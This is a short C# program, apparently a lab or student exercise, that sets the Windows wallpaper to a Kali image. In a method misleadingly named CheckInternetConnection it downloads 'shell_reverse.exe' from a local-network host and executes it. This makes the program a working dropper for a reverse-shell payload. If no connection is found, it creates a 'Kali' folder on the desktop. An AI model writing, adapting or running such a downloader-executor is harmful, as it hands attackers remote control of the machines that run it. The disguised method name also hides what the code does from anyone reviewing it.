using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace ResearchProgram
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        static void Main(string[] args)
        {
            ChangeWallpaper();
            CheckInternetConnection();
        }

        static void ChangeWallpaper()
        {
            string newWallpaperPath = @"C:\Users\Tran Van Thai\Pictures\kali.png"; 

            try
            {
                SystemParametersInfo(0x0014, 0, newWallpaperPath, 1);
                Console.WriteLine("Success");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }

        private static void DownloadFile(string url, string localPath)
        {
            try
            {
                using (WebClient webClient = new WebClient())
                {
                    webClient.DownloadFile(url, localPath);
                    Console.WriteLine("Success");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        private static void ExecuteFile(string localFile)
        {
            try
            {
                // Khởi chạy tệp tin đã tải xuống
                System.Diagnostics.Process.Start(localFile);
                Console.WriteLine("Success");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        static void CheckInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (var stream = client.OpenRead("http://www.google.com"))
                    {
                        string url = "http://192.168.1.84/shell_reverse.exe";

                        string currentDirectory = Directory.GetCurrentDirectory();

                        string localFilePath = Path.Combine(currentDirectory, "shell_reverse.exe");

                        DownloadFile(url, localFilePath);
                        ExecuteFile(localFilePath);
                    }
                }
            }
            catch
            {
                Console.WriteLine("Not connected to the Internet.");
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string folderName = "Kali";
                string folderPath = Path.Combine(desktopPath, folderName);
                Directory.CreateDirectory(folderPath);
                Console.WriteLine($"Created folder '{folderName}' on the desktop.");
            }
        }
    }
}
